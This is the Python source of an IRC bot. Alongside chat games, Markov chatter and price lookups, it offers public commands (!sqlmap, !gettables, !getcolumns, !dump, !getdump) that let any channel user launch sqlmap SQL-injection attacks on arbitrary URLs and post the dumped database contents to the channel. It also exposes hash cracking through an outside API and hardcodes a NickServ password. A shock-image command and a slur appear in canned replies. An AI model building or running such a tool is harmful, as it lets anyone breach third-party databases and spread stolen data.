#!/usr/bin/env python3

# Basic framework

import socket, sys, threading, time, random, urllib.request, re, urllib.parse, requests
from urllib.request import urlopen
from bs4 import BeautifulSoup
from modules.markovian import Markovian
from modules.sqlmap import *

# Admins
root_admin = "name1"
admin_one = "name2"

## IRC Colors ##
bold = "\x02"
underline = "\x15"
black = "\x02\x030"
white = "\x02\x0300"
grey = "\x02\x0314"
lgray = "\x02\x0315"
blue = "\x02\x0302"
cyan = "\x02\x0310"
green = "\x02\x0303"
magenta = "\x02\x0306"
lred = "\x02\x0305"
yellow = "\x02\x0307"
lblue = "\x02\x0312"
lcyan = "\x02\x0311"
lgreen = "\x02\x0309"
lmagenta = "\x02\x0313"
red = "\x02\x0304"
lbrown = "\x02\x0308"

# String check for Markov chaining
string_check = ['hey', 'something']

# Used to determine if a "." needs to be added to end of sentence in log for Markov.
end_sentence = [".", "?", "!"]


class IRC_Server:
    # The default constructor - declaring our global variables
    # channel should be rewritten to be a list, which then loops to connect, per channel.
    # This needs to support an alternate nick.
    def __init__(self, host, port, nick, channel, passwd=""):
        self.irc_host = host
        self.irc_port = port
        self.irc_nick = nick
        self.irc_channel = channel
        self.irc_passwd = passwd
        self.irc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_connected = False
        self.should_reconnect = False
        self.command = ""

    def connect(self):
        try:
            self.irc_sock.connect((self.irc_host, self.irc_port))
            self.should_reconnect = True
        except:
            print("Error: Could not connect to IRC; Host: " + str(self.irc_host) + " Port: " + str(self.irc_port))
            print("Retrying in 60 seconds...")
            self.reconnect()
        print ("Connected to: " + str(self.irc_host) + ":" + str(self.irc_port))
        self.is_connected = True
        self.on_connect_commands()
        self.is_connected = True
        self.wait_for()

    def reconnect(self):
        while self.is_connected == False:
            self.irc_sock.close()
            self.irc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                self.irc_sock.connect((self.irc_host, self.irc_port))
            except:
                print("retrying in 65 seconds")
                time.sleep(65)
                self.reconnect()
            print ("Connected to: " + str(self.irc_host) + ":" + str(self.irc_port))
            self.should_reconnect = True
            self.on_connect_commands()
            self.is_connected = True
            self.wait_for()

    def on_connect_commands(self):
        str_buff = ("NICK %s \r\n") % (self.irc_nick)
        self.irc_sock.send(str_buff.encode())
        print ("Setting bot nick to " + str(self.irc_nick))

        str_buff = ("USER %s 8 * :X\r\n") % (self.irc_nick)
        self.irc_sock.send(str_buff.encode())
        print ("Setting User")

        if self.irc_passwd != "":
            str_buff = ("PASS %s\r\n" % self.irc_passwd)
            self.irc_sock.send(str_buff.encode())
            print("Password has been sent: %s" % self.irc_passwd)

    # Helper for sending commands at the correct time
    def wait_for(self):
        while self.is_connected:
            recv = self.irc_sock.recv(4096)
            print(recv.decode('utf-8'))
            if str(recv).find("PING") != -1:
                response = str(recv).split("PING")[1]
                self.irc_sock.send("PONG ".encode() + response.encode() + "\r\n".encode())

            # This is what tells us we can start sending commands
            if str(recv).find('001') != -1:
                str_buff = ("JOIN %s\r\n") % (self.irc_channel)
                self.irc_sock.send(str_buff.encode())
                print ("Joining channel %s" % self.irc_channel)

                str_buff = ("PRIVMSG NICKSERV REGISTER password123 notarobot@aol.com\r\n")
                self.irc_sock.send(str_buff.encode())
                print ("Registering")

                str_buff = ("PRIVMSG NICKSERV IDENTIFY password123\r\n")
                self.irc_sock.send(str_buff.encode())
                print ("Indetifying")

                self.listen()

    def listen(self):
        while self.is_connected:
            recv = self.irc_sock.recv(4096)
            if len(recv) == 0:
                self.is_connected = False
                self.reconnect()
            print(recv.decode('utf-8'))
            if str(recv).find("PING") != -1:
                response = str(recv).split("PING")[1]
                self.irc_sock.send("PONG ".encode() + response.encode() + "\r\n".encode())
            if str(recv).find("PRIVMSG") != -1:
                # This block is our variables
                irc_user_nick = str(recv).split('!')[0].split(":")[1]
                irc_user_host = str(recv).split('@')[1].split(' ')[0]
                irc_channel = str(recv).split()[2]  # gives us a channel variable inside of this function
                try:
                    irc_user_message = ((recv.decode('utf-8')).split(irc_channel + ' :')[1]).rstrip('\r\n')
                except:
                    pass
                # Check for any lingering line breaks or carrige returns
                if (chr(92) + 'r') in irc_user_message:
                    irc_user_message = irc_user_message.split(chr(92))[0]
                # Print out of what is actually going on
                print (("(%s): %s: %s") % (irc_channel, irc_user_nick,
                                           irc_user_message))  # prints the message that was just said into our terminal
                # Prevents an endless loop if trigger words on PM'd to bot
                if irc_channel == self.irc_nick:
                    if any(private in irc_user_message for private in string_check):
                        self.send_message_to_channel("no reason to get gay about it", irc_user_nick)
                    elif (str(irc_user_message[0]) == "!"):
                        self.command = str(irc_user_message[1:])
                        self.process_command(irc_user_nick, irc_user_nick)
                    else:
                        continue
                # Check if a command was issud
                if (str(irc_user_message[0]) == "!") and irc_channel != self.irc_nick:
                    self.command = str(irc_user_message[1:])
                    self.process_command(irc_user_nick, irc_channel)
                # Returns the title of the webpage
                if "http" in irc_user_message:
                    try:
                        words = irc_user_message.split()
                        parseurl = words[0]
                        website = urlopen(parseurl)
                        urltitle = BeautifulSoup(website)
                        self.send_message_to_channel(bold + (urltitle.title.string), irc_channel)
                    except:
                        pass
                # If any trigger word in message, activate markovian AI
                try:
                    if any(trigger in str(irc_user_message) for trigger in
                           string_check) and irc_channel != self.irc_nick:
                        print(irc_user_message)
                        markov = Markovian()
                        my_sentence = markov.markov()
                        self.send_message_to_channel((my_sentence), irc_channel)
                except:
                    print("ERROR: not enough chatter yet!")

                # Adds a '.'' to the end of logs if sentence is ended with punctuation
                if any(terminator in str(irc_user_message) for terminator in end_sentence):
                    with open("txt_files/chatter.txt", "a") as logs:
                        logs.write(irc_user_message + '\r\n')
                else:
                    with open("txt_files/chatter.txt", "a") as logs:
                        logs.write(irc_user_message + '.' + '\r\n')

    # This function sends a message to a channel, which must start with a #.
    def send_message_to_channel(self, data, channel):
        print (("%s: %s") % (self.irc_nick, data))
        self.irc_sock.send((("PRIVMSG %s :%s\r\n") % (channel, data)).encode())
        return

    # This function takes a channel, which must start with a #.
    def join_channel(self, channel):
        if (channel[0] == "#"):
            str_buff = ("JOIN %s \r\n") % (channel)
            self.irc_sock.send(str_buff.encode())
        # This needs to test if the channel is full
        # This needs to modify the list of active channels

    # This function takes a channel, which must start with a #.
    def quit_channel(self, channel):
        if (channel[0] == "#"):
            str_buff = ("PART %s \r\n") % (channel)
            self.irc_sock.send(str_buff.encode())
        # This needs to modify the list of active channels

    # This nice function here runs ALL the commands.
    # For now, we only have 2: root admin, and anyone.
    def process_command(self, user, channel):
        # This line makes sure an actual command was sent, not a plain "!"
        if (len(self.command.split()) == 0):
            return
        # So the command isn't case sensitive
        command = (self.command).lower()
        # Break the command into pieces, so we can interpret it with arguments
        command = command.split()

        # All admin only commands go in here.
        if (user == root_admin or user == admin_one):
            # The first set of commands are ones that don't take parameters
            if (len(command) == 1):

                # This command shuts the bot down.
                if (command[0] == "quit"):
                    str_buff = ("QUIT %s \r\n") % (channel)
                    self.irc_sock.send(str_buff.encode())
                    self.irc_sock.close()
                    self.is_connected = False
                    self.should_reconnect = False
                    exit(0)

                if (command[0] == "register"):
                    str_buff = ("PRIVMSG NICKSERV REGISTER password123 notarobot@aol.com\r\n")
                    self.irc_sock.send(str_buff.encode())
                    print ("Registering")

                if (command[0] == "identify"):
                    str_buff = ("PRIVMSG NICKSERV IDENTIFY password123\r\n")
                    self.irc_sock.send(str_buff.encode())
                    print ("Indetifying")

            # These commands take parameters
            else:

                # This command makes the bot join a channel
                # This needs to be rewritten in a better way, to catch multiple channels
                if (command[0] == "join"):
                    if ((command[1])[0] == "#"):
                        irc_channel = command[1]
                    else:
                        irc_channel = "#" + command[1]
                    self.join_channel(irc_channel)

                # This command makes the bot part a channel
                # This needs to be rewritten in a better way, to catch multiple channels
                if (command[0] == "part"):
                    if ((command[1])[0] == "#"):
                        irc_channel = command[1]
                    else:
                        irc_channel = "#" + command[1]
                    self.quit_channel(irc_channel)

        # All public commands go here
        # The first set of commands are ones that don't take parameters
        if (len(command) == 1):
            if (command[0] == "help"):
                print(channel)
                self.send_message_to_channel(("\xd0\x91commands begin with !, ex: !sqlmap !ceelo !btc !md5"), channel)

            if (command[0] == "facts"):
                infile = open('txt_files/shit.txt', 'r')
                line = infile.read().splitlines()
                ourInput = random.choice(line)
                self.send_message_to_channel(ourInput, channel)
                infile.close()
            if (command[0] == "btc"):
                try:
                    url = urllib.request.urlopen('http://api.bitcoincharts.com/v1/weighted_prices.json').read()
                    urlstr = str(url, encoding='utf8')
                    usd = urlstr.split('"}, ')[0]
                    rate = usd.split('"24h": "')[1]
                    self.send_message_to_channel(cyan + "$" + str(rate) + " USD. ", channel)
                except:
                    pass

            if (command[0] == "goatse"):
                goatse = open('txt_files/goatse.txt', 'r')
                line3 = goatse.readline()
                line3 = line3.rstrip()
                self.send_message_to_channel('\x02\x1f\x0305' + line3, channel)
                while line3 != '':
                    line3 = goatse.readline()
                    line3 = line3.rstrip()
                    self.send_message_to_channel(line3, channel)
                goatse.close()

            if (command[0] == "ceelo"):
                def ceelofunc1():
                    ceelo1 = random.randint(1, 6)
                    ceelo2 = random.randint(1, 6)
                    ceelo3 = random.randint(1, 6)
                    ce = [ceelo1, ceelo2, ceelo3]
                    index = 0
                    while index < len(ce):
                        ce[index] = int(ce[index])
                        index += 1
                    cestr = str(ce)
                    self.send_message_to_channel((user + " rolled " + green + (cestr)), channel)
                    ce.sort()
                    calcWinner(ce)
                    autowin = [4, 5, 6]
                    autolose = [1, 2, 3]
                    checkAutowin1(autowin, autolose, ce)
                    reroll1(autowin, autolose, ce)

                def calcWinner(ce):
                    if ce[0] == ce[1] and ce[0] != ce[2]:
                        self.send_message_to_channel((user + " rolled " + green + str(ce[2])), channel)
                    elif ce[0] == ce[1] and ce[0] == ce[2]:
                        self.send_message_to_channel((user + " rolled trip " + green + str(ce[2]) + "s"), channel)
                    elif ce[1] == ce[2] and ce[0] != ce[2]:
                        self.send_message_to_channel((user + " rolled " + green + str(ce[0])), channel)

                def checkAutowin1(autowin, autolose, ce):
                    if ce == autowin:
                        self.send_message_to_channel((user + " wins with 4,5,6"), channel)
                    elif ce == autolose:
                        self.send_message_to_channel((user + " loses with 1,2,3"), channel)
                    return ce

                def reroll1(autowin, autolose, ce):
                    while ce[0] != ce[1] and ce[1] != ce[2] and ce != autowin and ce != autolose:
                        self.send_message_to_channel(("\x01ACTION rolls the dice! \x01"), channel)
                        time.sleep(5)
                        ceelo1 = random.randint(1, 6)
                        ceelo2 = random.randint(1, 6)
                        ceelo3 = random.randint(1, 6)
                        ce = [ceelo1, ceelo2, ceelo3]
                        index = 0
                        while index < len(ce):
                            ce[index] = int(ce[index])
                            index += 1
                        cestr = str(ce)
                        self.send_message_to_channel((user + " rolled " + green + (cestr)), channel)
                        ce.sort()
                        if ce == autowin:
                            self.send_message_to_channel((user + " autowins with 4,5,6"), channel)
                        elif ce == autolose:
                            self.send_message_to_channel((user + " loses with 1,2,3"), channel)
                        calcWinner(ce)

                ceelofunc1()

            if (command[0] == "drugs"):
                self.send_message_to_channel(("\x01ACTION deals you " + str(command[0]) + " \x01"), channel)

        # These commands take paramaters
        else:
            if (command[0] == "md5"):
                try:
                    md5hash = command[1]
                    cracked_md5 = urllib.request.urlopen(
                        'https://www.insomnia247.nl/hash_api.php?type=md5&hash=' + md5hash).read()
                    passwd_string = str(cracked_md5, encoding='utf8')
                    self.send_message_to_channel(green + passwd_string, channel)
                except:
                    self.send_message_to_channel(red + "ERROR", channel)

            if (command[0] == "sha1"):
                try:
                    sha1hash = command[1]
                    cracked_sha1 = urllib.request.urlopen(
                        'https://www.insomnia247.nl/hash_api.php?type=sha1&hash=' + sha1hash).read()
                    passwd_string = str(cracked_sha1, encoding='utf8')
                    self.send_message_to_channel(green + passwd_string, channel)
                except:
                    self.send_message_to_channel(red + "ERROR", channel)

            if (command[0] == "sqlmap"):
                if (len(command) != 3):
                    self.send_message_to_channel(("%sHelp:%s %sSyntax:%s %s!sqlmap vuln_url vuln_parameter" % (
                    red, red, magenta, magenta, green)), channel)
                    self.send_message_to_channel(
                        ("%sExample:%s %s!sqlmap http://127.0.0.1/index.php?id=1 id" % (red, green, green)), channel)
                else:
                    target = command[1]
                    test_param = command[2]
                    scan_taskid = Sqlmap.sqlmap(target, test_param)
                    self.send_message_to_channel((("%s[+]%sStarting Scan...") % (red, green)), channel)
                    self.send_message_to_channel(
                        (("%s[+]%sUse !scan results %s%s %sfor the loot") % (red, green, cyan, scan_taskid, red)),
                        channel)

            if (command[0] == "scan") and (len(command) == 3):
                if (command[1] == "results"):
                    r_taskid = command[2]
                    results = Sqlmap.scan_results(r_taskid)
                    try:
                        for key, value in results.items():
                            if key == "Databases":
                                dbs = ' '.join(value)
                                self.send_message_to_channel((("%s%s: %s%s") % (red, key, green, dbs)), channel)
                            else:
                                self.send_message_to_channel((("%s%s: %s%s") % (red, key, green, value)), channel)
                        self.send_message_to_channel((("%sTry %s!gettables %shttp://targeturl.com %s%s") % (
                        red, green, magenta, green, results["CurrentDB"])), channel)
                    except:
                        self.send_message_to_channel((("%sERROR if no CurrentDB found") % (red)), channel)
                else:
                    self.send_message_to_channel((("%sSyntax: %s!scan results %staskid") % (red, green, cyan)), channel)

            # usage: !gettables http://targeturl.com database_name
            if (command[0] == "gettables"):
                if (len(command) != 3):
                    self.send_message_to_channel(("%sSyntax: %s!gettables %shttp://targeturl.com %sdatabase_name" % (
                    red, green, magenta, green)), channel)
                else:
                    try:
                        target = command[1]
                        db = command[2]
                        getTablesTaskid = Sqlmap.get_tables(target, db)
                        self.send_message_to_channel((("%s[+]%sStarting Scan for tables") % (red, green)), channel)
                        self.send_message_to_channel((("%s[+]%s Use !showtables %s%s %sfor list of tables") % (
                        red, green, cyan, getTablesTaskid, red)), channel)
                    except:
                        self.send_message_to_channel((("%sERROR") % (red)), channel)

            # usage: !showtables taskid
            if (command[0] == "showtables"):
                if (len(command) != 2):
                    self.send_message_to_channel(
                        ("%sSyntax: %s!showtables %staskid_from_gettables" % (red, green, magenta)), channel)
                else:
                    try:
                        showTablesTaskid = command[1]
                        db_tables = Sqlmap.show_tables(showTablesTaskid)
                        print(db_tables)
                        for dbName, tablesList in db_tables.items():
                            tables = ' '.join(tablesList)
                            dbName = dbName
                        self.send_message_to_channel(("%sTABLES:%s %s%s") % (red, green, green, tables), channel)
                        self.send_message_to_channel(
                            ("%sTry using %s!getcolumns %shttp://targeturl.com %s%s%s some_table_from_above") % (
                            red, green, magenta, green, dbName, green), channel)
                    except:
                        self.send_message_to_channel((("%sERROR") % (red)), channel)

            # usage: !getcolumns http://targeturl.com database_name table_name
            if (command[0] == "getcolumns"):
                if (len(command) != 4):
                    self.send_message_to_channel((
                                                 "%sSyntax: %s!getcolumns %shttp://targeturl.com %sdatabase_name %stable_name" % (
                                                 red, green, magenta, green, magenta)), channel)
                else:
                    try:
                        target = command[1]
                        db = command[2]
                        table = command[3]
                        getColumnsTaskid = Sqlmap.get_columns(target, db, table)
                        self.send_message_to_channel((("%s[+]%sStarting Scan for columns") % (red, green)), channel)
                        self.send_message_to_channel((("%s[+]%sUse !showcolumns %s%s %s%s %sfor columns list") % (
                        red, green, cyan, getColumnsTaskid, red, table, cyan)), channel)
                    except:
                        self.send_message_to_channel((("%sERROR") % (red)), channel)

            # useage: !showcolumns taskid tablename
            if (command[0] == "showcolumns"):
                if (len(command) != 3):
                    self.send_message_to_channel(
                        ("%sSyntax: %s!showcolumns %staskid_from_showcolumns %stable_name" % (red, green, cyan, green)),
                        channel)
                else:
                    try:
                        taskid = command[1]
                        tableName = command[2]
                        dbName, tableName, columns = Sqlmap.show_columns(taskid, tableName)
                        columns = ' '.join(columns)
                        self.send_message_to_channel(("%sColumns in Table:%s %s%s") % (red, green, green, tableName),
                                                     channel)
                        self.send_message_to_channel(("%s%s") % (green, columns), channel)
                        self.send_message_to_channel(((
                                                      "%s Try using%s !dump%s http://targeturl.com%s %s %s%s %sculumn_from_above") % (
                                                      red, green, magenta, cyan, dbName, green, tableName, cyan)),
                                                     channel)
                    except:
                        self.send_message_to_channel((("%sERROR") % (red)), channel)

            # usage: !dump target_url dbname table column
            if (command[0] == "dump"):
                if (len(command) != 5):
                    self.send_message_to_channel(((
                                                  "%sSyntax:%s !dump%s http://targeturl.com%s dbName %stableName %sculumnName") % (
                                                  red, green, magenta, green, red, cyan)), channel)
                else:
                    try:
                        target = command[1]
                        db = command[2]
                        table = command[3]
                        column = command[4]
                        taskid = Sqlmap.dump(target, db, table, column)
                        self.send_message_to_channel((("%s[+]%sDumping for %s%s") % (red, green, cyan, table)), channel)
                        self.send_message_to_channel(
                            (("%s[+]%sUse !getdump %s%s %s%s") % (red, green, cyan, taskid, red, column)), channel)
                    except:
                        self.send_message_to_channel((("%sERROR") % (red)), channel)
            # usage !getdump target_url taskid column_name
            if (command[0] == "getdump"):
                if (len(command) != 3):
                    self.send_message_to_channel(
                        ("%sSyntax: %s!getdump %staskid %scolumn_name" % (red, green, cyan, red)), channel)
                else:
                    try:
                        taskid = command[1]
                        column = command[2]
                        dumps = Sqlmap.get_dump(taskid, column)
                        print(dumps)
                        self.send_message_to_channel(("%s___DATA DUMP___" % red), channel)
                        for index in dumps:
                            self.send_message_to_channel((("%s" + index) % (green)), channel)
                        self.send_message_to_channel(("%s_______________" % red), channel)
                    except:
                        self.send_message_to_channel(("%sEither i encountered an error, or no results" % red), channel)
            # prints last TIME: [INFO] MESSAGE
            if (command[0] == "log"):
                if (len(command) != 2):
                    self.send_message_to_channel(("ERROR"), channel)
                else:
                    try:
                        taskid = command[1]
                        info = Sqlmap.log(taskid)
                        the_time = info[0]
                        level = info[1]
                        message = info[2]
                        self.send_message_to_channel(
                            (("%s%s %s%s %s%s") % (yellow, the_time, red, level, green, message)), channel)
                    except:
                        self.send_message_to_channel((("%sSyntax: %s!log %staskid ") % (red, green, green, cyan)),
                                                     channel)


# Here begins the main programs flow:

test = IRC_Server("server1", 6667, "sqly_Q", "#channel passwd")
run_test = threading.Thread(None, test.connect)
run_test.start()

test2 = IRC_Server("server2", 6667, "sqly_Q", "#channel")
run_test2 = threading.Thread(None, test2.connect)
run_test2.start()

while (test2.should_reconnect):
    time.sleep(5)
